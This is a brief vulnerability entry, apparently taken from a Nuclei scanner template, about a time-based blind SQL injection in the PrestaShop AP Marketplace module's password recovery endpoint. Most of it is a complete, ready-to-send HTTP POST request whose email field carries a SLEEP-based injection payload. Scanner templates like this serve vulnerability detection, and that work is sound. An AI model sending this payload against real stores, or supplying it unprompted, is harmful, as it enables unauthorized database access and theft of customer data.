# Vulnerability: PrestaShop Ap Marketplace - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`prestashop-apmarketplace-sqli.yaml`)

## Description
The AP Marketplace Prestashop module is vulnerable to Blind/Time SQL Injection. An attacker can exploit this vulnerability to execute arbitrary SQL queries on the underlying database.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
POST /m/apmarketplace/passwordrecovery HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}
X-Requested-With: XMLHttpRequest

email="+AND+(SELECT+3472+FROM+(SELECT(SLEEP(6)))UTQK)--+IGIe&submit_reset_pwd=
```

